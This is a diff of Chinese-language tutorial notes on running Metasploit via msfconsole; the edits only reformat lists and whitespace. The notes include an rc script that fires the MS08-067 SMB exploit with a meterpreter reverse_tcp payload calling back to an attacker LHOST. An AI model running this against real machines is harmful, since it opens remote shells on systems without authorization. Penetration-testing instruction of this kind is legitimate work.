@@ -7,25 +7,27 @@
 ## 透過 msfconsole 使用 Metasploit
 
 1. 管理 Metasploit 資料庫
-2. 管理 Session
-3. 配置、啟動 Metasploit framework
+1. 管理 Session
+1. 配置、啟動 Metasploit framework
 
 
 啟動前必須先連上資料庫，可透過 ``ps -aux`` 來確認
 
 ```shell
-$ service postgresql start
-$ msfdb init
+service postgresql start
+msfdb init
 ```
 
 啟動 msf concole
 
 ```shell
-$ msfconsole
+msfconsole
 ```
+
 在 msfconsole 中先確認是否成功連上資料庫
+
 ```shell
-$ db_status
+db_status
 ```
 
 常用指令分為兩大類： `Core command` 以及 ``db backend command``
@@ -41,7 +43,7 @@ Core command:
   # set payload [path-to-payload] 指定加載 payload
   # set RHOST 192.168.0.43 指定 Remote Host IP 位址
 
-> options 
+> options
   # 列出現在可以配置的選項，在 module 裡面的第一步就是看 options 說明書。
   # 如果不在任何模組之下，則會顯示 Global options
 > run # 啟動攻擊模組, alias to exploit
@@ -51,7 +53,7 @@ Core command:
   > show auxiliary #秀出所有 auxiliary 模組
     # auxiliary 包含 scanners, DoS modules, fuzzers, and more...
   > show exploits # 秀出所有攻擊模組
-  > show options  
+  > show options
   > show payloads
   > show advanced # 進階 fine-tune 模組設定
   > show targets # 秀出該模組適合攻擊的 OS
@@ -70,7 +72,7 @@ Core command:
 
 ```sh
   $ msfconsole --help # 秀出 command options
-  
+
   ##############################
     Database options
       -M, --migration-path DIRECTORY   Specify a directory containing additional DB migrations
@@ -97,13 +99,14 @@ Core command:
         -h, --help                       Show this message
   ##############################
 ```
+
 先將指令寫成 ``temp.rc``：
 
 ```rc
-  use exploit/windows/smb/ms08_067_netapi  
-  set RHOST [IP]  
-  set PAYLOAD windows/meterpreter/reverse_tcp  
-  set LHOST [IP]  
+  use exploit/windows/smb/ms08_067_netapi
+  set RHOST [IP]
+  set PAYLOAD windows/meterpreter/reverse_tcp
+  set LHOST [IP]
   run
 ```
 
@@ -144,7 +147,8 @@ Meterpreter 就是一個 payload, 在漏洞利用後必須執行的一支程式�
 
 
 
-# Reference
+## Reference
+
 * [Metasploit Fundamentals](https://www.offensive-security.com/metasploit-unleashed/using-databases/)
 
 * [Metasploit for Beginners](MetaSploit tutorial for beginners)
